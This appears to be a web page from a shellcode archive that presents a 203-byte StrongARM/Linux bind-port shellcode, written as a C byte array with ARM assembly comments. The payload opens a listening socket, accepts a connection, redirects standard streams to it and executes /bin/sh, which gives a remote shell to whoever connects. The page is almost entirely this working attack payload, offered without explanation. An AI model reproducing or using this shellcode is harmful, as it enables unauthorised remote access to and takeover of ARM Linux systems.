<html><head><title>StrongARM - bind() portshell - 203 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * 203 byte StrongARM/Linux bind() portshell shellcode
 * funkysh
 */

char shellcode[]= &quot;\x20\x60\x8f\xe2&quot;   /*  add   r6, pc, #32           */
                  &quot;\x07\x70\x47\xe0&quot;   /*  sub   r7, r7, r7            */
                  &quot;\x01\x70\xc6\xe5&quot;   /*  strb  r7, [r6, #1]          */
                  &quot;\x01\x30\x87\xe2&quot;   /*  add   r3, r7, #1            */
                  &quot;\x13\x07\xa0\xe1&quot;   /*  mov   r0, r3, lsl r7        */
                  &quot;\x01\x20\x83\xe2&quot;   /*  add   r2, r3, #1            */
                  &quot;\x07\x40\xa0\xe1&quot;   /*  mov   r4, r7                */
                  &quot;\x0e\xe0\x4e\xe0&quot;   /*  sub   lr, lr, lr            */
                  &quot;\x1c\x40\x2d\xe9&quot;   /*  stmfd sp!, {r2-r4, lr}      */
                  &quot;\x0d\x10\xa0\xe1&quot;   /*  mov   r1, sp                */
                  &quot;\x66\xff\x90\xef&quot;   /*  swi   0x90ff66     (socket) */
                  &quot;\x10\x57\xa0\xe1&quot;   /*  mov   r5, r0, lsl r7        */
                  &quot;\x35\x70\xc6\xe5&quot;   /*  strb  r7, [r6, #53]         */
                  &quot;\x14\x20\xa0\xe3&quot;   /*  mov   r2, #20               */
                  &quot;\x82\x28\xa9\xe1&quot;   /*  mov   r2, r2, lsl #17       */
                  &quot;\x02\x20\x82\xe2&quot;   /*  add   r2, r2, #2            */
                  &quot;\x14\x40\x2d\xe9&quot;   /*  stmfd sp!, {r2,r4, lr}      */
                  &quot;\x10\x30\xa0\xe3&quot;   /*  mov   r3, #16               */
                  &quot;\x0d\x20\xa0\xe1&quot;   /*  mov   r2, sp                */
                  &quot;\x0d\x40\x2d\xe9&quot;   /*  stmfd sp!, {r0, r2, r3, lr} */
                  &quot;\x02\x20\xa0\xe3&quot;   /*  mov   r2, #2                */
                  &quot;\x12\x07\xa0\xe1&quot;   /*  mov   r0, r2, lsl r7        */
                  &quot;\x0d\x10\xa0\xe1&quot;   /*  mov   r1, sp                */
                  &quot;\x66\xff\x90\xef&quot;   /*  swi   0x90ff66       (bind) */
                  &quot;\x45\x70\xc6\xe5&quot;   /*  strb  r7, [r6, #69]         */
                  &quot;\x02\x20\x82\xe2&quot;   /*  add   r2, r2, #2            */
                  &quot;\x12\x07\xa0\xe1&quot;   /*  mov   r0, r2, lsl r7        */
                  &quot;\x66\xff\x90\xef&quot;   /*  swi   0x90ff66     (listen) */
                  &quot;\x5d\x70\xc6\xe5&quot;   /*  strb  r7, [r6, #93]         */
                  &quot;\x01\x20\x82\xe2&quot;   /*  add   r2, r2, #1            */
                  &quot;\x12\x07\xa0\xe1&quot;   /*  mov   r0, r2, lsl r7        */
                  &quot;\x04\x70\x8d\xe5&quot;   /*  str   r7, [sp, #4]          */
                  &quot;\x08\x70\x8d\xe5&quot;   /*  str	 r7, [sp, #8]          */
                  &quot;\x66\xff\x90\xef&quot;   /*  swi   0x90ff66     (accept) */
                  &quot;\x10\x57\xa0\xe1&quot;   /*  mov   r5, r0, lsl r7        */
                  &quot;\x02\x10\xa0\xe3&quot;   /*  mov   r1, #2                */
                  &quot;\x71\x70\xc6\xe5&quot;   /*  strb  r7, [r6, #113]        */
                  &quot;\x15\x07\xa0\xe1&quot;   /*  mov   r0, r5, lsl r7 &lt;dup2&gt; */
                  &quot;\x3f\xff\x90\xef&quot;   /*  swi   0x90ff3f       (dup2) */
                  &quot;\x01\x10\x51\xe2&quot;   /*  subs  r1, r1, #1            */
                  &quot;\xfb\xff\xff\x5a&quot;   /*  bpl   &lt;dup2&gt;                */
                  &quot;\x99\x70\xc6\xe5&quot;   /*  strb  r7, [r6, #153]        */
                  &quot;\x14\x30\x8f\xe2&quot;   /*  add   r3, pc, #20           */
                  &quot;\x04\x30\x8d\xe5&quot;   /*  str	 r3, [sp, #4]          */
                  &quot;\x04\x10\x8d\xe2&quot;   /*  add   r1, sp, #4            */
                  &quot;\x02\x20\x42\xe0&quot;   /*  sub   r2, r2, r2            */
                  &quot;\x13\x02\xa0\xe1&quot;   /*  mov   r0, r3, lsl r2        */
                  &quot;\x08\x20\x8d\xe5&quot;   /*  str   r2, [sp, #8]          */
                  &quot;\x0b\xff\x90\xef&quot;   /*  swi	 0x900ff0b    (execve) */
                  &quot;/bin/sh&quot;;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
